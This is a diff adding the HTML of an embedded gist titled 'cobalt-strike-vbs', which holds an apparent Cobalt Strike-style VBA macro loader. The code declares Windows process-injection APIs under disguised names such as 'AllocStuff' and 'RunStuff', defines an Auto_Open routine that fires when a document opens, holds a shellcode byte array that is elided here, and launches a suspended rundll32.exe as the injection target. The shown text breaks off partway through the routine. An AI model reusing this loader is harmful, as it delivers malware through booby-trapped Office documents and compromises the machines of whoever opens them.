@@ -1,0 +1,340 @@
+<div id="gist107737907" class="gist">
+    <div class="gist-file">
+      <div class="gist-data">
+        <div class="js-gist-file-update-container js-task-list-container file-box">
+  <div id="file-cobalt-strike-vbs" class="file my-2">
+    
+
+  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-vbscript  ">
+      
+<table class="highlight tab-size js-file-line-container" data-tab-size="8" data-paste-markdown-skip="">
+      <tbody><tr>
+        <td id="file-cobalt-strike-vbs-L1" class="blob-num js-line-number" data-line-number="1"></td>
+        <td id="file-cobalt-strike-vbs-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">Private</span> <span class="pl-smi">Type</span> <span class="pl-smi">PROCESS_INFORMATION</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L2" class="blob-num js-line-number" data-line-number="2"></td>
+        <td id="file-cobalt-strike-vbs-LC2" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">hProcess</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L3" class="blob-num js-line-number" data-line-number="3"></td>
+        <td id="file-cobalt-strike-vbs-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">hThread</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L4" class="blob-num js-line-number" data-line-number="4"></td>
+        <td id="file-cobalt-strike-vbs-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwProcessId</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L5" class="blob-num js-line-number" data-line-number="5"></td>
+        <td id="file-cobalt-strike-vbs-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwThreadId</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L6" class="blob-num js-line-number" data-line-number="6"></td>
+        <td id="file-cobalt-strike-vbs-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-k">End</span> <span class="pl-smi">Type</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L7" class="blob-num js-line-number" data-line-number="7"></td>
+        <td id="file-cobalt-strike-vbs-LC7" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L8" class="blob-num js-line-number" data-line-number="8"></td>
+        <td id="file-cobalt-strike-vbs-LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-k">Private</span> <span class="pl-smi">Type</span> <span class="pl-smi">STARTUPINFO</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L9" class="blob-num js-line-number" data-line-number="9"></td>
+        <td id="file-cobalt-strike-vbs-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">cb</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L10" class="blob-num js-line-number" data-line-number="10"></td>
+        <td id="file-cobalt-strike-vbs-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">lpReserved</span> <span class="pl-k">As</span> <span class="pl-k">String</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L11" class="blob-num js-line-number" data-line-number="11"></td>
+        <td id="file-cobalt-strike-vbs-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">lpDesktop</span> <span class="pl-k">As</span> <span class="pl-k">String</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L12" class="blob-num js-line-number" data-line-number="12"></td>
+        <td id="file-cobalt-strike-vbs-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">lpTitle</span> <span class="pl-k">As</span> <span class="pl-k">String</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L13" class="blob-num js-line-number" data-line-number="13"></td>
+        <td id="file-cobalt-strike-vbs-LC13" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwX</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L14" class="blob-num js-line-number" data-line-number="14"></td>
+        <td id="file-cobalt-strike-vbs-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwY</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L15" class="blob-num js-line-number" data-line-number="15"></td>
+        <td id="file-cobalt-strike-vbs-LC15" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwXSize</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L16" class="blob-num js-line-number" data-line-number="16"></td>
+        <td id="file-cobalt-strike-vbs-LC16" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwYSize</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L17" class="blob-num js-line-number" data-line-number="17"></td>
+        <td id="file-cobalt-strike-vbs-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwXCountChars</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L18" class="blob-num js-line-number" data-line-number="18"></td>
+        <td id="file-cobalt-strike-vbs-LC18" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwYCountChars</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L19" class="blob-num js-line-number" data-line-number="19"></td>
+        <td id="file-cobalt-strike-vbs-LC19" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwFillAttribute</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L20" class="blob-num js-line-number" data-line-number="20"></td>
+        <td id="file-cobalt-strike-vbs-LC20" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">dwFlags</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L21" class="blob-num js-line-number" data-line-number="21"></td>
+        <td id="file-cobalt-strike-vbs-LC21" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">wShowWindow</span> <span class="pl-k">As</span> <span class="pl-k">Integer</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L22" class="blob-num js-line-number" data-line-number="22"></td>
+        <td id="file-cobalt-strike-vbs-LC22" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">cbReserved2</span> <span class="pl-k">As</span> <span class="pl-k">Integer</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L23" class="blob-num js-line-number" data-line-number="23"></td>
+        <td id="file-cobalt-strike-vbs-LC23" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">lpReserved2</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L24" class="blob-num js-line-number" data-line-number="24"></td>
+        <td id="file-cobalt-strike-vbs-LC24" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">hStdInput</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L25" class="blob-num js-line-number" data-line-number="25"></td>
+        <td id="file-cobalt-strike-vbs-LC25" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">hStdOutput</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L26" class="blob-num js-line-number" data-line-number="26"></td>
+        <td id="file-cobalt-strike-vbs-LC26" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">hStdError</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L27" class="blob-num js-line-number" data-line-number="27"></td>
+        <td id="file-cobalt-strike-vbs-LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-k">End</span> <span class="pl-smi">Type</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L28" class="blob-num js-line-number" data-line-number="28"></td>
+        <td id="file-cobalt-strike-vbs-LC28" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L29" class="blob-num js-line-number" data-line-number="29"></td>
+        <td id="file-cobalt-strike-vbs-LC29" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">#</span><span class="pl-k">If</span> <span class="pl-smi">VBA7</span> <span class="pl-k">Then</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L30" class="blob-num js-line-number" data-line-number="30"></td>
+        <td id="file-cobalt-strike-vbs-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-smi">PtrSafe</span> <span class="pl-k">Function</span> <span class="pl-smi">CreateStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"CreateRemoteThread"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">hProcess</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpThreadAttributes</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">dwStackSize</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpStartAddress</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr,</span> <span class="pl-smi">lpParameter</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">dwCreationFlags</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-smi">lpThreadID</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">)</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L31" class="blob-num js-line-number" data-line-number="31"></td>
+        <td id="file-cobalt-strike-vbs-LC31" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-smi">PtrSafe</span> <span class="pl-k">Function</span> <span class="pl-smi">AllocStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"VirtualAllocEx"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">hProcess</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpAddr</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lSize</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">flAllocationType</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">flProtect</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">)</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L32" class="blob-num js-line-number" data-line-number="32"></td>
+        <td id="file-cobalt-strike-vbs-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-smi">PtrSafe</span> <span class="pl-k">Function</span> <span class="pl-smi">WriteStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"WriteProcessMemory"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">hProcess</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lDest</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr,</span> <span class="pl-k">ByRef</span> <span class="pl-smi">Source</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">Length</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">LengthWrote</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr)</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L33" class="blob-num js-line-number" data-line-number="33"></td>
+        <td id="file-cobalt-strike-vbs-LC33" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-smi">PtrSafe</span> <span class="pl-k">Function</span> <span class="pl-smi">RunStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"CreateProcessA"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">lpApplicationName</span> <span class="pl-k">As</span> <span class="pl-k">String</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpCommandLine</span> <span class="pl-k">As</span> <span class="pl-k">String</span><span class="pl-smi">,</span> <span class="pl-smi">lpProcessAttributes</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-smi">lpThreadAttributes</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">bInheritHandles</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">dwCreationFlags</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-smi">lpEnvironment</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpCurrentDirectory</span> <span class="pl-k">As</span> <span class="pl-k">String</span><span class="pl-smi">,</span> <span class="pl-smi">lpStartupInfo</span> <span class="pl-k">As</span> <span class="pl-smi">STARTUPINFO,</span> <span class="pl-smi">lpProcessInformation</span> <span class="pl-k">As</span> <span class="pl-smi">PROCESS_INFORMATION)</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L34" class="blob-num js-line-number" data-line-number="34"></td>
+        <td id="file-cobalt-strike-vbs-LC34" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">#</span><span class="pl-k">Else</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L35" class="blob-num js-line-number" data-line-number="35"></td>
+        <td id="file-cobalt-strike-vbs-LC35" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-k">Function</span> <span class="pl-smi">CreateStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"CreateRemoteThread"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">hProcess</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpThreadAttributes</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">dwStackSize</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpStartAddress</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-smi">lpParameter</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">dwCreationFlags</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-smi">lpThreadID</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">)</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L36" class="blob-num js-line-number" data-line-number="36"></td>
+        <td id="file-cobalt-strike-vbs-LC36" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-k">Function</span> <span class="pl-smi">AllocStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"VirtualAllocEx"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">hProcess</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpAddr</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lSize</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">flAllocationType</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">flProtect</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">)</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L37" class="blob-num js-line-number" data-line-number="37"></td>
+        <td id="file-cobalt-strike-vbs-LC37" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-k">Function</span> <span class="pl-smi">WriteStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"WriteProcessMemory"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">hProcess</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lDest</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByRef</span> <span class="pl-smi">Source</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">Length</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">LengthWrote</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">)</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L38" class="blob-num js-line-number" data-line-number="38"></td>
+        <td id="file-cobalt-strike-vbs-LC38" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Private</span> <span class="pl-k">Declare</span> <span class="pl-k">Function</span> <span class="pl-smi">RunStuff</span> <span class="pl-k">Lib</span> <span class="pl-s">"kernel32"</span> <span class="pl-k">Alias</span> <span class="pl-s">"CreateProcessA"</span> <span class="pl-smi">(</span><span class="pl-k">ByVal</span> <span class="pl-smi">lpApplicationName</span> <span class="pl-k">As</span> <span class="pl-k">String</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpCommandLine</span> <span class="pl-k">As</span> <span class="pl-k">String</span><span class="pl-smi">,</span> <span class="pl-smi">lpProcessAttributes</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-smi">lpThreadAttributes</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">bInheritHandles</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">dwCreationFlags</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-smi">lpEnvironment</span> <span class="pl-k">As</span> <span class="pl-smi">Any,</span> <span class="pl-k">ByVal</span> <span class="pl-smi">lpCurrentDriectory</span> <span class="pl-k">As</span> <span class="pl-k">String</span><span class="pl-smi">,</span> <span class="pl-smi">lpStartupInfo</span> <span class="pl-k">As</span> <span class="pl-smi">STARTUPINFO,</span> <span class="pl-smi">lpProcessInformation</span> <span class="pl-k">As</span> <span class="pl-smi">PROCESS_INFORMATION)</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L39" class="blob-num js-line-number" data-line-number="39"></td>
+        <td id="file-cobalt-strike-vbs-LC39" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">#</span><span class="pl-k">End</span> <span class="pl-k">If</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L40" class="blob-num js-line-number" data-line-number="40"></td>
+        <td id="file-cobalt-strike-vbs-LC40" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L41" class="blob-num js-line-number" data-line-number="41"></td>
+        <td id="file-cobalt-strike-vbs-LC41" class="blob-code blob-code-inner js-file-line"><span class="pl-k">Sub</span> <span class="pl-smi">Auto_Open()</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L42" class="blob-num js-line-number" data-line-number="42"></td>
+        <td id="file-cobalt-strike-vbs-LC42" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Dim</span> <span class="pl-smi">myByte</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-smi">myArray</span> <span class="pl-k">As</span> <span class="pl-k">Variant</span><span class="pl-smi">,</span> <span class="pl-smi">offset</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L43" class="blob-num js-line-number" data-line-number="43"></td>
+        <td id="file-cobalt-strike-vbs-LC43" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Dim</span> <span class="pl-smi">pInfo</span> <span class="pl-k">As</span> <span class="pl-smi">PROCESS_INFORMATION</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L44" class="blob-num js-line-number" data-line-number="44"></td>
+        <td id="file-cobalt-strike-vbs-LC44" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Dim</span> <span class="pl-smi">sInfo</span> <span class="pl-k">As</span> <span class="pl-smi">STARTUPINFO</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L45" class="blob-num js-line-number" data-line-number="45"></td>
+        <td id="file-cobalt-strike-vbs-LC45" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Dim</span> <span class="pl-smi">sNull</span> <span class="pl-k">As</span> <span class="pl-k">String</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L46" class="blob-num js-line-number" data-line-number="46"></td>
+        <td id="file-cobalt-strike-vbs-LC46" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Dim</span> <span class="pl-smi">sProc</span> <span class="pl-k">As</span> <span class="pl-k">String</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L47" class="blob-num js-line-number" data-line-number="47"></td>
+        <td id="file-cobalt-strike-vbs-LC47" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L48" class="blob-num js-line-number" data-line-number="48"></td>
+        <td id="file-cobalt-strike-vbs-LC48" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">#</span><span class="pl-k">If</span> <span class="pl-smi">VBA7</span> <span class="pl-k">Then</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L49" class="blob-num js-line-number" data-line-number="49"></td>
+        <td id="file-cobalt-strike-vbs-LC49" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Dim</span> <span class="pl-smi">rwxpage</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr,</span> <span class="pl-smi">res</span> <span class="pl-k">As</span> <span class="pl-smi">LongPtr</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L50" class="blob-num js-line-number" data-line-number="50"></td>
+        <td id="file-cobalt-strike-vbs-LC50" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">#</span><span class="pl-k">Else</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L51" class="blob-num js-line-number" data-line-number="51"></td>
+        <td id="file-cobalt-strike-vbs-LC51" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Dim</span> <span class="pl-smi">rwxpage</span> <span class="pl-k">As</span> <span class="pl-k">Long</span><span class="pl-smi">,</span> <span class="pl-smi">res</span> <span class="pl-k">As</span> <span class="pl-k">Long</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L52" class="blob-num js-line-number" data-line-number="52"></td>
+        <td id="file-cobalt-strike-vbs-LC52" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">#</span><span class="pl-k">End</span> <span class="pl-k">If</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L53" class="blob-num js-line-number" data-line-number="53"></td>
+        <td id="file-cobalt-strike-vbs-LC53" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">myArray</span> <span class="pl-smi">=</span> <span class="pl-smi">Array(-</span><span class="pl-s">4</span><span class="pl-smi">,-</span><span class="pl-s">24</span><span class="pl-smi">,</span><span class="pl-s">8</span><span class="pl-smi">,</span> <span class="pl-smi">...)</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L54" class="blob-num js-line-number" data-line-number="54"></td>
+        <td id="file-cobalt-strike-vbs-LC54" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L55" class="blob-num js-line-number" data-line-number="55"></td>
+        <td id="file-cobalt-strike-vbs-LC55" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">If</span> <span class="pl-smi">Len(Environ(</span><span class="pl-s">"ProgramW6432"</span><span class="pl-smi">))</span> <span class="pl-smi">&gt;</span> <span class="pl-s">0</span> <span class="pl-k">Then</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L56" class="blob-num js-line-number" data-line-number="56"></td>
+        <td id="file-cobalt-strike-vbs-LC56" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">sProc</span> <span class="pl-smi">=</span> <span class="pl-smi">Environ(</span><span class="pl-s">"windir"</span><span class="pl-smi">)</span> <span class="pl-smi">&amp;</span> <span class="pl-s">"\\SysWOW64\\rundll32.exe"</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L57" class="blob-num js-line-number" data-line-number="57"></td>
+        <td id="file-cobalt-strike-vbs-LC57" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">Else</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L58" class="blob-num js-line-number" data-line-number="58"></td>
+        <td id="file-cobalt-strike-vbs-LC58" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">sProc</span> <span class="pl-smi">=</span> <span class="pl-smi">Environ(</span><span class="pl-s">"windir"</span><span class="pl-smi">)</span> <span class="pl-smi">&amp;</span> <span class="pl-s">"\\System32\\rundll32.exe"</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L59" class="blob-num js-line-number" data-line-number="59"></td>
+        <td id="file-cobalt-strike-vbs-LC59" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">End</span> <span class="pl-k">If</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L60" class="blob-num js-line-number" data-line-number="60"></td>
+        <td id="file-cobalt-strike-vbs-LC60" class="blob-code blob-code-inner js-file-line">
+</td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L61" class="blob-num js-line-number" data-line-number="61"></td>
+        <td id="file-cobalt-strike-vbs-LC61" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">res</span> <span class="pl-smi">=</span> <span class="pl-smi">RunStuff(sNull,</span> <span class="pl-smi">sProc,</span> <span class="pl-k">ByVal</span> <span class="pl-s">0&amp;</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-s">0&amp;</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-s">1&amp;</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-s">4&amp;</span><span class="pl-smi">,</span> <span class="pl-k">ByVal</span> <span class="pl-s">0&amp;</span><span class="pl-smi">,</span> <span class="pl-smi">sNull,</span> <span class="pl-smi">sInfo,</span> <span class="pl-smi">pInfo)</span></td>
+      </tr>
+      <tr>
+        <td id="file-cobalt-strike-vbs-L62" class="blob-num js-line-number" data-line-number="62"></td>
